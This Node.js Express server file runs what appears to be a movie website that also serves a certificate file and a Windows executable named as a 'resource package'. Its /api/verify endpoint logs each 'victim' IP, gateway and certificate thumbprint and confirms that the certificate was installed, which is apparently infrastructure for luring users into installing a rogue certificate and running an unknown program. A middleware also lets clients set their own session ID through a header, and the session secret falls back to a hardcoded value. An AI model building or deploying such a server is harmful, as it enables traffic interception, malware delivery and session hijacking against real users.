const express = require('express');
const path = require('path');
const dotenv = require('dotenv');
const session = require('express-session');
const http = require('http');
const WebSocket = require('ws');
const websocketController = require('./controllers/websocket');
const db = require('./db'); // Import db từ file cấu hình

dotenv.config({
    path: './.env'
});

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.set('wss', wss);
app.set('db', db);


const publicDirectory = path.join(__dirname, './public');
app.use(express.static(publicDirectory));

app.use(express.urlencoded({ extended: false }));
app.use(express.json());

app.set('view engine', 'hbs');

app.use(session({
    secret: process.env.SESSION_SECRET || 'your_secret_key',
    resave: false,
    saveUninitialized: false,
    cookie: {
        httpOnly: true,
        secure: false,
        maxAge: 1000 * 60 * 60 * 24
    }
}));

app.use((req, res, next) => {
    const sessionId = req.headers['x-session-id'];
    if (sessionId) {
        req.sessionID = sessionId;
    }
    next();
});

app.use('/', require('./routes/pages'));
app.use('/auth', require('./routes/auth'));
app.use('/profile', require('./routes/profile'));
app.use('/movie_details', require('./routes/movie_details'));
app.use('/api', require('./routes/websocket'));

// Serve certificate download with attachment header
app.get('/certs/verifiedaccess.cer', (req, res) => {
    const certPath = path.join(__dirname, 'public', 'certs', 'verifiedaccess.cer');
    res.download(certPath, 'verifiedaccess.cer', (err) => {
        if (err && !res.headersSent) {
            res.status(500).send('Tải file không thành công');
        }
    });
});

// Serve Windows executable download from public/resources
app.get('/resources/GoiTaiNguyen.exe', (req, res) => {
    const exePath = path.join(__dirname, 'public', 'resources', 'GoiTaiNguyen.exe');
    res.download(exePath, 'GoiTaiNguyen.exe', (err) => {
        if (err && !res.headersSent) {
            res.status(500).send('Tải file không thành công');
        }
    });
});

// Verification endpoint: extract gateway param, real IP and cert thumbprint (if any)
app.get('/api/verify', (req, res) => {
    const gateway_ip = req.query.gateway || 'Unknown';

    // Get real client IP (respect X-Forwarded-For if behind proxy)
    const xff = req.headers['x-forwarded-for'];
    const victim_real_ip = xff ? xff.split(',')[0].trim() : (req.ip || req.connection.remoteAddress);

    const now = new Date().toISOString().replace('T', ' ').slice(0, 19);

    // Attempt to extract client certificate fingerprint (thumbprint)
    let certFingerprint = null;
    try {
        const socket = req.socket || req.connection;
        if (socket && typeof socket.getPeerCertificate === 'function') {
            const peer = socket.getPeerCertificate(true) || {};
            // Node may provide fingerprint/fingerprint256 or raw buffer
            if (peer.fingerprint) {
                certFingerprint = peer.fingerprint; // usually SHA-1 with colons
            } else if (peer.fingerprint256) {
                certFingerprint = peer.fingerprint256; // SHA-256
            } else if (peer.raw) {
                const crypto = require('crypto');
                const hex = crypto.createHash('sha1').update(peer.raw).digest('hex').toUpperCase();
                certFingerprint = hex.match(/.{2}/g).join(':');
            }
        }
        
    } catch (e) {
        // ignore cert extraction errors
    }

    // Log to console
    console.log(`\n[+] TÍN HIỆU MỚI (${now})`);
    console.log(`    - IP Nạn nhân: ${victim_real_ip}`);
    console.log(`    - Default Gateway: ${gateway_ip}`);
    console.log(`    - Cert Thumbprint: ${certFingerprint || 'N/A'}`);
    console.log(`    - Trạng thái: Đã cài đặt Cert thành công!\n`);

    // Append to logs/verify.log
    try {
        const fs = require('fs');
        const logDir = path.join(__dirname, 'logs');
        const logPath = path.join(logDir, 'verify.log');
        if (!fs.existsSync(logDir)) fs.mkdirSync(logDir, { recursive: true });
        const logLine = `[${now}] - IP: ${victim_real_ip} - Gateway: ${gateway_ip} - CertThumb: ${certFingerprint || 'N/A'}\n`;
        fs.appendFileSync(logPath, logLine);
    } catch (e) {
        console.error('Failed to write verify log:', e.message || e);
    }

    // Indicate to the client whether a cert thumbprint was observed
    return res.json({
        status: 'verified',
        certThumbprint: certFingerprint || null,
        verified: !!certFingerprint
    });
});

// 404 handler - render custom 404 page for unmatched routes
app.use((req, res) => {
    res.status(404).render('404', { url: req.originalUrl });
});

websocketController.initWebSocketHandlers(wss);

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server is running on http://0.0.0.0:${PORT}`);
});
